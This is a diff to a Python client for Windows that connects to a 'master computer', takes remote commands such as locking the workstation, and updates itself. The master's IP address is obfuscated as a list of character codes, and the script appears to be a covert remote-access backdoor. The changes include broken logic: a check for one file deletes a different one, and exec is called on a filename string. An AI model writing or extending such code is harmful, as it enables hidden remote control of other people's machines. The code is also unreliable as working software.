@@ -12,9 +12,6 @@ except:
     import ctypes
 import win32api, win32con
 
-if os.path.isfile("old.pyw"):
-    os.remove("old.pyw")
-
 PI = [49, 48, 46, 48, 46, 48, 46, 49, 50, 54]
 IP = ''.join(map(chr, PI))
 PORT = 5050
@@ -25,6 +22,10 @@ CONNECTED = False
 client = None
 
 def processCommand(cmd, args):
+    if os.path.isfile("old.pyw"):
+        os.remove("old.pyw")
+    if os.path.isfile("new.pyw"):
+        os.remove("old.pyw")
     if cmd == "lock":
         subprocess.call("Rundll32.exe user32.dll,LockWorkStation", shell=False)
         return "!READY"
@@ -92,7 +93,7 @@ def processCommand(cmd, args):
             os.rename("source.pyw", "old.pyw")
             os.rename("new.pyw", "source.pyw")
             client.close()
-            import source
+            exec("source.pyw")
             return "!UPDATE"
     else:
         print('[ERROR] Unknown command: ' + '"' + cmd + '"')
@@ -115,8 +116,7 @@ def Receive():
                         args = msgList
                     toSend = processCommand(cmd, args)
                     if toSend == "!UPDATE":
-                        client.close()
-                        return
+                        return True
                     else:
                         client.send(toSend.encode("utf-8"))
             except:
@@ -138,7 +138,9 @@ def checkConnection():
                 client.connect(ADDR)
                 CONNECTED = True
                 print("[CLIENT] Successfully connected to master computer!")
-                Receive()
+                abort = Receive()
+                if abort:
+                    return
                 break
             except:
                 CONNECTED = False
